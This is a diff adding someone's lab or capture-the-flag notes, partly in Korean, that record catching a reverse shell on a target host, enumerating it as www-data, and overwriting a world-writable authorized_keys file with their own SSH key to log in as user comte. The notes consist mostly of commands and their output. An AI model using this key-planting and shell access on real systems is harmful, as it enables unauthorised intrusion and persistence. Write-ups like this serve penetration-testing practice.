@@ -405,6 +405,163 @@ bash: D: command not found
 
 # ip: 10.201.71.110
 
+# reverse shell success!
+
+─(root㉿docker-desktop)-[/]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.8.136.212] from (UNKNOWN) [10.201.71.110] 59146
+sh: 0: can't access tty; job control turned off
+$ls 
+adminpanel.css
+images
+index.html
+login.css
+login.php
+messages.html
+orders.html
+secret-script.php
+style.css
+supersecretadminpanel.html
+supersecretmessageforadmin
+users.html
+$
+
+$ pwd
+/var/www/html
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ cd home
+$ ls
+comte
+ubuntu
+
+cd comte
+$ ls
+snap
+user.txt
+
+# 안 열리네 ...
+
+drwx------ 3 comte comte 4096 Mar 25 2024 snap
+-rw------- 1 comte comte 4276 Sep 15 2023 user.txt
+
+$ ls -al
+total 24
+drwxr-xr-x 3 ubuntu ubuntu 4096 Aug 4 10:35 .
+drwxr-xr-x 4 root root 4096 Aug 4 10:35 ..
+-rw-r--r-- 1 ubuntu ubuntu 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25 2020 .bashrc
+-rw-r--r-- 1 ubuntu ubuntu 807 Feb 25 2020 .profile
+drwx------ 2 ubuntu ubuntu 4096 Aug 4 10:35 .ssh
+
+# comte 유저 .ssh 발견
+
+$ cd /home/comte/
+$ ls -al
+total 52
+drwxr-xr-x 7 comte comte 4096 Apr 4 2024 .
+drwxr-xr-x 4 root root 4096 Aug 4 10:35 ..
+-rw------- 1 comte comte 55 Apr 4 2024 .Xauthority
+lrwxrwxrwx 1 comte comte 9 Apr 4 2024 .bash_history -> /dev/null
+-rw-r--r-- 1 comte comte 220 Feb 25 2020 .bash_logout
+-rw-r--r-- 1 comte comte 3771 Feb 25 2020 .bashrc
+drwx------ 2 comte comte 4096 Sep 27 2023 .cache
+drwx------ 3 comte comte 4096 Mar 25 2024 .gnupg
+drwxrwxr-x 3 comte comte 4096 Mar 25 2024 .local
+-rw-r--r-- 1 comte comte 807 Feb 25 2020 .profile
+drwxr-xr-x 2 comte comte 4096 Mar 25 2024 .ssh
+-rw-r--r-- 1 comte comte 0 Sep 27 2023 .sudo_as_admin_successful
+drwx------ 3 comte comte 4096 Mar 25 2024 snap
+-rw------- 1 comte comte 4276 Sep 15 2023 user.txt
+
+authorized_keys
+$ ls -al
+total 12
+drwxr-xr-x 2 comte comte 4096 Mar 25 2024 .
+drwxr-xr-x 7 comte comte 4096 Apr 4 2024 ..
+-rw-rw-rw- 1 comte comte 101 Aug 4 14:08 authorized_keys
+$
+
+# 공개키 생성
+
+┌──(root㉿docker-desktop)-[/]
+└─# ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/root/.ssh/id*ed25519):
+Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /root/.ssh/id_ed25519
+Your public key has been saved in /root/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:qnl77ebZO2ZVigRWMblteFIxPxaeJg8NeAitMYKdyRo root@docker-desktop
+The key's randomart image is:
++--[ED25519 256]--+
+| + o.o.*+oo |
+| E \_ oo+.o=oo|
+| o ..+..B B.|
+| . . = X o|
+| S . = + |
+| . . o |
+| . . . |
+| o. . oo+ |
+| o..o ++ooo |
++----[SHA256]-----+
+
+┌──(root㉿docker-desktop)-[/]
+└─# cat /root/.ssh/id_ed25519.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmlWmqRlmMIc40OFLpAQwuH+Dvu7WWOVDaK/djJ2F3I root@docker-desktop
+
+# 공개키 설정
+
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmlWmqRlmMIc40OFLpAQwuH+Dvu7WWOVDaK/djJ2F3I root@docker-desktop' > /home/comte/.ssh/authorized_keys
+
 # ip: 10.201.71.110
+
+# ssh access
+
+ssh -i /root/.ssh/id_ed25519 comte@10.201.71.110
+
+┌──(root㉿docker-desktop)-[/]
+└─# ssh -i /root/.ssh/id_ed25519 comte@10.201.71.110
+The authenticity of host '10.201.71.110 (10.201.71.110)' can't be established.
+ED25519 key fingerprint is SHA256:fEZEYx5zTn15pnnIUB/bgh+k+/4/LT69vsGaFpZdfcY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.71.110' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+- Documentation: https://help.ubuntu.com
+- Management: https://landscape.canonical.com
+- Support: https://ubuntu.com/pro
+
+System information as of Mon 04 Aug 2025 02:11:49 PM UTC
+
+System load: 0.08 Processes: 139
+Usage of /: 30.4% of 18.53GB Users logged in: 0
+Memory usage: 9% IPv4 address for ens5: 10.201.71.110
+Swap usage: 0%
+
+- Introducing Expanded Security Maintenance for Applications.
+  Receive updates to over 25,000 software packages with your
+  Ubuntu Pro subscription. Free for personal use.
+
+  https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+8 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Thu Apr 4 17:26:03 2024 from 192.168.0.112
+comte@ip-10-201-71-110:~$
 
 # ip: 10.201.71.110
